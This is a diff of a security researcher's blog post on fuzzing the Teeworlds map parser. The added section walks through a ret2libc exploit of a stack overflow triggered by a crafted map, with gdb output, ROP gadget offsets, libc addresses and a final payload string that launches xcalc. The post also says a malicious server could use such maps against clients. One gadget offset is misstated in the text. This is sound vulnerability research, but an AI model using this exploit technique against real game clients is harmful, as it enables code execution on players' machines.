@@ -28,7 +28,7 @@
  	<h1>Fuzzing game map parsers, part 1 - Teeworlds</h1>
 	<div><span class="post_list_date">2021-11-01</span></div>
  	<div class="entry">
-   	<p><strong>tl;dr</strong>: Using AFLplusplus for fuzzing map parser in Teeworlds. Two different approaches (quick and thorough) result in 15 crashes in total.</p>
+   	<p><strong>tl;dr</strong>: Using AFLplusplus for fuzzing map parser in Teeworlds. Two different approaches (quick and thorough) result in 15 crashes in total (one exploitable).</p>
 
 <h2 id="intro">Intro</h2>
 
@@ -267,7 +267,71 @@ WRITE of size 4 at 0x7ffffffd8f78 thread T0
 };
 </code></pre></div></div>
 
-<p>It looked promising, however, I didn’t find a working way to exploit it, and as it wasn’t the main area of my effort I postponed it for another time.</p>
+<p><del>It looked promising, however, I didn’t find a working way to exploit it, and as it wasn’t the main area of my effort I postponed it for another time.</del></p>
+
+<p>Update: Is a friend pointed out and put me in the right direction, I did a mistake analyzing an optimized code (which was weird for a project compiled with the <code class="highlighter-rouge">-O0</code> flag). However, the <a href="https://www.teeworlds.com/?page=downloads">official build</a> does not have an optimized code that broke exploitation attempts. Additionally, the binary even has the stack protection disabled what makes it even easier.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ checksec --file=teeworlds 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   4168) Symbols     No    0               12              teeworlds
+</code></pre></div></div>
+
+<p>With a little modification made to the map, I overwrote the instruction pointer.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb --args ./teeworlds 'connect 127.0.0.1' 
+[...]
+Thread 1 "teeworlds" received signal SIGSEGV, Segmentation fault.
+0x000000aabbccddee in ?? ()
+</code></pre></div></div>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>I decided to exploit it just for fun. Unfortunately, there were no other bugs that could be chained to bypass ASLR. For the purpose of the exercise, I continued with ASLR disabled and use ret2libc technique to pop a calc executing <code class="highlighter-rouge">system("/usr/bin/xcalc")</code>.</p>
+
+<p>To succeed with ret2libc exploited, I required the following things:</p>
+
+<ol>
+  <li>Gadget with <code class="highlighter-rouge">ret</code> and <code class="highlighter-rouge">pop rdi; ret</code> instructions to align the stack, load the parameter for the <code class="highlighter-rouge">system</code> function and jump to it
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ROPgadget --binary teeworlds | grep 'pop rdi ; ret'
+[...]
+0x0000000000011339 : pop rdi ; ret
+[...]
+</code></pre></div>    </div>
+    <ul>
+      <li>The <code class="highlighter-rouge">pop rdi; ret</code> instructions were at offset <code class="highlighter-rouge">0x011339</code> and the sole <code class="highlighter-rouge">ret</code> at <code class="highlighter-rouge">0x011339</code></li>
+      <li>To make use of those instructions it was also necessary to calculate their absolute addresses by adding their offsets to the address at which the binary was loaded.
+        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) info proc mappings
+process 13108
+Mapped address spaces:
+
+   Start Addr           End Addr       Size     Offset objfile
+   0x555555554000     0x555555695000   0x141000        0x0 /home/osboxes/Downloads/teeworlds-0.7.5-linux_x86_64/teeworlds
+</code></pre></div>        </div>
+        <ul>
+          <li><code class="highlighter-rouge">0x555555554000 + 0x01133A = 0x55555556533A</code></li>
+          <li><code class="highlighter-rouge">0x555555554000 + 0x011339 = 0x555555565339</code></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Address of the <code class="highlighter-rouge">system</code> function
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) p system
+$3 = {int (const char *)} 0x7ffff76c9410 &lt;__libc_system&gt;
+</code></pre></div>    </div>
+  </li>
+  <li>Address of the <code class="highlighter-rouge">/usr/bin/xcalc</code> string
+    <ul>
+      <li>I put the string in that part of the map that was written to the stack. The exact address I found by examining available strings on the stack under gdb.
+        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x7ffffffddc20: "/usr/bin/xcalc"
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<p>Having all the prerequisites, I combined them into a final exploit: <code class="highlighter-rouge">3A535655555500 39535655555500 20DCFDFFFF7F00 10946CF7FF7F00</code> and I put it in the place of the value that was messing with the instruction pointer. So that time when the map was loaded, the stack was overwritten with valid addresses that redirected execution into the <code class="highlighter-rouge">system</code> function with the desired parameter.</p>
+
+<p><img src="/images/teeexploit.gif" alt="" /></p>
 
 <h3 id="additional-bug">Additional bug</h3>
 <p>When running with ASAN, the game was crashing immediately and reporting use after free error. To avoid this problem during the fuzzing I disabled ASAN for the faulty method.</p>
@@ -299,7 +363,7 @@ index 85f1bde1..d0cb938d 100644
 
 <h2 id="summary">Summary</h2>
 
-<p>Two approaches to fuzzing a map parser detected <strong>15</strong> crashes in total. All of those findings could be used to set up a malicious server and mess up clients’ memory and crash them. As the results appeared satisfying I will look into other online games as well.</p>
+<p>Two approaches to fuzzing a map parser detected <strong>15</strong> crashes in total. All of those findings could be used to set up a malicious server and mess up clients’ memory and crash them. One of them turned out to be serious enough to allow code execution. As the results appeared satisfying I will look into other online games as well.</p>
 
  	</div>
 </article>
